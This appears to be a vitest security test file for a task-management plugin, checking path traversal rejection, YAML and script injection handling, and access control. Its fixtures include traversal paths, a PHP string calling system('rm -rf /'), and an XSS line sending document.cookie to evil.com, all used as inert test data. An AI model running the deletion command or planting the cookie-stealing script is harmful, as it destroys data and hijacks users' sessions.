/**
 * Security Audit E2E Tests for spec-task plugin.
 *
 * Verifies the plugin is resilient against:
 *   - Path traversal attacks (task_name, task_dir, agent_workspace, project_root)
 *   - YAML injection / script injection in status.yaml content
 *   - Access control violations (read-only dirs, non-existent paths)
 *
 * All tests use isolated temp directories via createTestEnv().
 * Path traversal tests use /tmp/* paths to avoid actually writing to sensitive locations.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdir, rm, readFile, writeFile, stat } from "fs/promises";
import { join, resolve, basename } from "path";
import { tmpdir } from "os";
import YAML from "yaml";
import type { TaskStatusData } from "../../src/types.js";
import { createTestEnv, createTask, readStatus } from "./helpers.js";

import { executeTaskCreate } from "../../src/tools/task-create.js";
import { executeTaskTransition } from "../../src/tools/task-transition.js";
import { executeTaskLog } from "../../src/tools/task-log.js";
import { executeTaskVerify } from "../../src/tools/task-verify.js";
import { executeTaskResume } from "../../src/tools/task-resume.js";
import { executeTaskArchive } from "../../src/tools/task-archive.js";
import { executeConfigMerge } from "../../src/tools/config-merge.js";
import { executeTaskRecall } from "../../src/tools/task-recall.js";

// ============================================================================
// Helper: parse ToolResponse → JSON
// ============================================================================

function parseResponse(response: { content: Array<{ type: string; text: string }> }): any {
  return JSON.parse(response.content[0].text);
}

// ============================================================================
// Suite 1: Path Traversal in task_name
// ============================================================================

describe("Security: Path Traversal in task_name", () => {
  let env: Awaited<ReturnType<typeof createTestEnv>>;
  beforeEach(async () => { env = await createTestEnv(); });
  afterEach(async () => { await env.cleanup(); });

  it("should reject '/' in task_name (../escape)", async () => {
    const result = await executeTaskCreate("test-1", {
      task_name: "../escape",
      project_root: env.projectRoot,
    });
    const data = parseResponse(result);
    expect(data.success).toBe(false);
    expect(data.error).toBe("INVALID_PARAMS");
    expect(data.message).toContain("illegal characters");
  });

  it("should reject '\\0' (null byte) in task_name", async () => {
    const result = await executeTaskCreate("test-2", {
      task_name: "task\0name",
      project_root: env.projectRoot,
    });
    const data = parseResponse(result);
    expect(data.success).toBe(false);
    expect(data.error).toBe("INVALID_PARAMS");
    expect(data.message).toContain("illegal characters");
  });

  it("should reject '\\\\' in task_name", async () => {
    const result = await executeTaskCreate("test-3", {
      task_name: "..\\escape",
      project_root: env.projectRoot,
    });
    const data = parseResponse(result);
    expect(data.success).toBe(false);
    expect(data.error).toBe("INVALID_PARAMS");
    expect(data.message).toContain("illegal characters");
  });

  it("should reject deeply nested path in task_name (../../etc/evil)", async () => {
    const result = await executeTaskCreate("test-4", {
      task_name: "../../etc/evil",
      project_root: env.projectRoot,
    });
    const data = parseResponse(result);
    expect(data.success).toBe(false);
    expect(data.error).toBe("INVALID_PARAMS");
    expect(data.message).toContain("illegal characters");
  });
});

// ============================================================================
// Suite 2: Path Traversal in task_dir
// ============================================================================

describe("Security: Path Traversal in task_dir", () => {
  let env: Awaited<ReturnType<typeof createTestEnv>>;
  // Sentinel path to verify nothing was written there during tests
  let sentinelPath: string;
  beforeEach(async () => {
    env = await createTestEnv();
    // Use a path under /tmp that does NOT contain status.yaml
    sentinelPath = join(env.projectRoot, "sentinel-no-status");
    await mkdir(sentinelPath, { recursive: true });
  });
  afterEach(async () => { await env.cleanup(); });

  it("task_transition with path traversal task_dir should return TASK_NOT_FOUND (not write outside workspace)", async () => {
    const traversalDir = join(sentinelPath, "../../../etc");
    const result = await executeTaskTransition("test-5", {
      task_dir: traversalDir,
      status: "running",
    });
    const data = parseResponse(result);
    expect(data.success).toBe(false);
    expect(data.error).toBe("TASK_NOT_FOUND");
  });

  it("task_log with path traversal task_dir should return TASK_NOT_FOUND (not write outside workspace)", async () => {
    const traversalDir = join(sentinelPath, "../../../../tmp/evil-target");
    const result = await executeTaskLog("test-6", {
      task_dir: traversalDir,
      action: { action: "error", step: "evil", message: "injected" },
    });
    const data = parseResponse(result);
    expect(data.success).toBe(false);
    expect(data.error).toBe("TASK_NOT_FOUND");
  });

  it("task_verify with path traversal task_dir should return TASK_NOT_FOUND", async () => {
    const traversalDir = join(sentinelPath, "../../../var/log");
    const result = await executeTaskVerify("test-7", {
      task_dir: traversalDir,
      action: { action: "get" },
    });
    const data = parseResponse(result);
    expect(data.success).toBe(false);
    expect(data.error).toBe("TASK_NOT_FOUND");
  });

  it("task_resume with path traversal task_dir should return TASK_NOT_FOUND", async () => {
    const traversalDir = join(sentinelPath, "../../etc");
    const result = await executeTaskResume("test-8", {
      task_dir: traversalDir,
    });
    const data = parseResponse(result);
    expect(data.success).toBe(false);
    expect(data.error).toBe("TASK_NOT_FOUND");
  });

  it("task_archive with path traversal agent_workspace (dry_run) should reveal planned paths without creating files", async () => {
    // Create a real task first
    const { taskDir } = await createTask(env.specTaskDir, "archive-traversal-task", {
      title: "Archive Traversal Test",
    });
    // Complete the task first
    await writeFile(join(taskDir, "checklist.md"), "- [x] Done\n", "utf-8");

    // Use a traversed agent_workspace pointing outside the test env
    const evilWorkspace = join(env.projectRoot, "sentinel-no-status", "../../../../tmp/evil-workspace");

    const result = await executeTaskArchive("test-9", {
      task_dir: taskDir,
      agent_workspace: evilWorkspace,
      dry_run: true,
    });
    const data = parseResponse(result);
    expect(data.success).toBe(true);
    expect(data.dry_run).toBe(true);

    // Verify planned file paths contain the traversed workspace
    const plannedFiles = data.results.map((r: { file: string }) => r.file);
    expect(plannedFiles.length).toBeGreaterThan(0);

    // CRITICAL: verify no files were actually created at the traversed location
    for (const plannedFile of plannedFiles) {
      await expect(stat(plannedFile)).rejects.toThrow();
    }
  });
});

// ============================================================================
// Suite 3: YAML Injection
// ============================================================================

describe("Security: YAML Injection", () => {
  let env: Awaited<ReturnType<typeof createTestEnv>>;
  beforeEach(async () => { env = await createTestEnv(); });
  afterEach(async () => { await env.cleanup(); });

  it("should round-trip task with YAML special characters in title", async () => {
    // Title with characters that could break YAML parsing
    const maliciousTitle = '": key: value\n- injected_list_item\n<script>alert(1)</script>';
    const { taskDir } = await createTask(env.specTaskDir, "yaml-inject-task", {
      title: maliciousTitle,
    });

    // Read back via helpers (YAML.parse)
    const status = await readStatus(taskDir);
    expect(status.title).toBe(maliciousTitle);
    expect(status.task_id).toBe("yaml-inject-task");
    expect(status.status).toBe("pending");

    // Also read raw YAML to verify it was properly quoted/escaped
    const rawContent = await readFile(join(taskDir, "status.yaml"), "utf-8");
    expect(rawContent).toContain("yaml-inject-task");
    // Re-parse to double-check
    const reparsed = YAML.parse(rawContent) as TaskStatusData;
    expect(reparsed.title).toBe(maliciousTitle);
  });

  it("should treat script injection in status.yaml as plain text when read back", async () => {
    const { taskDir } = await createTask(env.specTaskDir, "script-inject-task", {
      title: "Script Inject Test",
    });

    // Manually write a status.yaml with script injection in error messages
    const status = await readStatus(taskDir);
    status.errors.push({
      step: "injection-step",
      message: '<?php echo "pwned"; system("rm -rf /"); ?>',
      retry_count: 0,
      timestamp: new Date().toISOString(),
    });
    status.alerts.push({
      type: "security",
      message: '<script>window.location="http://evil.com?cookie="+document.cookie</script>',
      timestamp: new Date().toISOString(),
    });
    await writeFile(join(taskDir, "status.yaml"), YAML.stringify(status), "utf-8");

    // Read back via the tool (executeTaskResume) — should parse as plain text
    const result = await executeTaskResume("test-10", { task_dir: taskDir });
    const data = parseResponse(result);
    expect(data.success).toBe(true);

    // The injected content should appear as plain strings, not executed
    expect(data.details).toBeDefined();
    const errorStep = data.errors[0];
    expect(errorStep.message).toContain("<?php");
    expect(errorStep.message).toContain("pwned");
    expect(errorStep.step).toBe("injection-step");

    const alertEntry = data.alerts[0];
    expect(alertEntry.message).toContain("<script>");
    expect(alertEntry.message).toContain("evil.com");

    // Also verify via raw read that it's stored as text, not parsed as YAML directives
    const rawContent = await readFile(join(taskDir, "status.yaml"), "utf-8");
    expect(rawContent).toContain("<?php");
    expect(rawContent).toContain("<script>");
  });

  it("should handle colons and YAML-like structures in verification criteria", async () => {
    const { taskDir } = await createTask(env.specTaskDir, "yaml-criteria-task", {
      title: "YAML Criteria Test",
    });

    // Start the task (pending → assigned → running)
    const assignResult = await executeTaskTransition("test-11", {
      task_dir: taskDir,
      status: "assigned",
    });
    expect(parseResponse(assignResult).success).toBe(true);

    const transResult = await executeTaskTransition("test-11b", {
      task_dir: taskDir,
      status: "running",
    });
    expect(parseResponse(transResult).success).toBe(true);

    // Add criterion with YAML-like content
    const criterion = 'key: value\nanother_key: "nested: value"';
    const verifyResult = await executeTaskVerify("test-12", {
      task_dir: taskDir,
      action: { action: "add-criterion", criterion, result: "passed", evidence: "tested" },
    });
    expect(parseResponse(verifyResult).success).toBe(true);

    // Read back to verify the criterion is stored as-is
    const status = await readStatus(taskDir);
    const storedCriterion = status.verification.criteria.find(c => c.criterion === criterion);
    expect(storedCriterion).toBeDefined();
    expect(storedCriterion!.result).toBe("passed");
    expect(storedCriterion!.evidence).toBe("tested");
  });
});

// ============================================================================
// Suite 4: Access Control
// ============================================================================

describe("Security: Access Control", () => {
  let env: Awaited<ReturnType<typeof createTestEnv>>;
  beforeEach(async () => { env = await createTestEnv(); });
  afterEach(async () => { await env.cleanup(); });

  it("task_create in read-only directory should fail gracefully (not crash)", async () => {
    // Use /dev/null/impossible — mkdir under /dev/null fails with ENOTDIR
    const readOnlyDir = "/dev/null/impossible";

    // The function should throw (not silently succeed or hang)
    // The important thing is: no files are created outside the workspace
    await expect(
      executeTaskCreate("test-13", {
        task_name: "read-only-attack",
        project_root: readOnlyDir,
      })
    ).rejects.toThrow();

    // Verify no files were created under /dev
    const testDir = join(readOnlyDir, "spec-task", "read-only-attack");
    await expect(stat(testDir)).rejects.toThrow();
  });

  it("task_archive with non-existent agent_workspace should create directories recursively", async () => {
    const { taskDir } = await createTask(env.specTaskDir, "archive-new-workspace", {
      title: "Archive New Workspace Test",
    });
    await writeFile(join(taskDir, "brief.md"), "# Archive New Workspace Test\n\nTest brief.\n", "utf-8");

    // Create a non-existent agent_workspace path (nested, doesn't exist yet)
    const newWorkspace = join(env.projectRoot, "brand", "new", "workspace", "path");

    // Verify it doesn't exist yet
    await expect(stat(newWorkspace)).rejects.toThrow();

    const result = await executeTaskArchive("test-14", {
      task_dir: taskDir,
      agent_workspace: newWorkspace,
      dry_run: false,
    });
    const data = parseResponse(result);
    expect(data.success).toBe(true);
    expect(data.dry_run).toBe(false);

    // Verify files were created in the new workspace
    const historyDir = join(newWorkspace, "memory", "task-history");
    const lessonsDir = join(newWorkspace, "memory", "task-lessons");
    await expect(stat(historyDir)).resolves.toBeDefined();
    await expect(stat(lessonsDir)).resolves.toBeDefined();

    // Verify history file content is correct (title comes from brief.md first line)
    const date = new Date().toISOString().slice(0, 10);
    const historyFile = join(historyDir, date, "archive-new-workspace.md");
    const historyContent = await readFile(historyFile, "utf-8");
    expect(historyContent).toContain("archive-new-workspace");
    expect(historyContent).toContain("Archive New Workspace Test");

    // Verify lessons file content is correct
    const lessonsFile = join(lessonsDir, "archive-new-workspace.md");
    const lessonsContent = await readFile(lessonsFile, "utf-8");
    expect(lessonsContent).toContain("Lessons");
  });

  it("task_archive with non-existent task_dir should return TASK_NOT_FOUND", async () => {
    const result = await executeTaskArchive("test-15", {
      task_dir: "/tmp/nonexistent-task-dir-xyz-12345",
      agent_workspace: env.agentWorkspace,
      dry_run: false,
    });
    const data = parseResponse(result);
    expect(data.success).toBe(false);
    expect(data.error).toBe("TASK_NOT_FOUND");
  });

  it("config_merge with non-existent project_root creates config but should not leak sensitive data", async () => {
    const tempDir = join(tmpdir(), `security-config-test-${Date.now()}`);
    const nonExistentRoot = join(tempDir, "does-not-exist-yet");

    // Verify it doesn't exist
    await expect(stat(nonExistentRoot)).rejects.toThrow();

    const result = await executeConfigMerge("test-16", {
      project_root: nonExistentRoot,
    });
    const data = parseResponse(result);
    // ConfigManager.ensureProjectConfig creates the dir + config.yaml automatically
    expect(data.success).toBe(true);
    expect(data.config).toBeDefined();

    // Cleanup
    await rm(tempDir, { recursive: true, force: true });
  });
});

// ============================================================================
// Suite 5: Additional Security Checks
// ============================================================================

describe("Security: Additional Edge Cases", () => {
  let env: Awaited<ReturnType<typeof createTestEnv>>;
  beforeEach(async () => { env = await createTestEnv(); });
  afterEach(async () => { await env.cleanup(); });

  it("task_create with empty task_name should return INVALID_PARAMS", async () => {
    const result = await executeTaskCreate("test-17", {
      task_name: "",
      project_root: env.projectRoot,
    });
    const data = parseResponse(result);
    expect(data.success).toBe(false);
    expect(data.error).toBe("INVALID_PARAMS");
  });

  it("task_create with whitespace-only task_name should return INVALID_PARAMS", async () => {
    const result = await executeTaskCreate("test-18", {
      task_name: "   ",
      project_root: env.projectRoot,
    });
    const data = parseResponse(result);
    expect(data.success).toBe(false);
    expect(data.error).toBe("INVALID_PARAMS");
  });

  it("task_create should not allow creating task outside project_root via task_name resolution", async () => {
    // Even without path separators, task_dir is computed as resolve(project_root/spec-task/task_name)
    // So the task_dir should always be within project_root
    const result = await executeTaskCreate("test-19", {
      task_name: "safe-task-name",
      project_root: env.projectRoot,
    });
    const data = parseResponse(result);
    expect(data.success).toBe(true);

    // Verify task_dir is within project_root
    const taskDir = data.task_dir as string;
    const resolvedTaskDir = resolve(taskDir);
    const resolvedProjectRoot = resolve(env.projectRoot);
    expect(resolvedTaskDir).toContain(resolvedProjectRoot);
    expect(resolvedTaskDir).toContain("spec-task");
    expect(resolvedTaskDir).toContain("safe-task-name");
  });

  it("task_recall should not expose files outside agent_workspace/memory", async () => {
    // Create some .md files inside workspace memory
    const historyDir = join(env.agentWorkspace, "memory", "task-history", "2026-01-01");
    await mkdir(historyDir, { recursive: true });
    await writeFile(join(historyDir, "secret-task.md"), "# Secret\npassword=12345\n", "utf-8");

    // task_recall only searches within agent_workspace/memory/task-history and task-lessons
    const result = await executeTaskRecall("test-20", {
      keywords: "password",
      agent_workspace: env.agentWorkspace,
    });
    const data = parseResponse(result);
    expect(data.success).toBe(true);
    // Results should only contain files from within the workspace
    for (const r of data.results) {
      const filePath = r.file as string;
      expect(filePath).toContain(env.agentWorkspace);
    }
  });
});
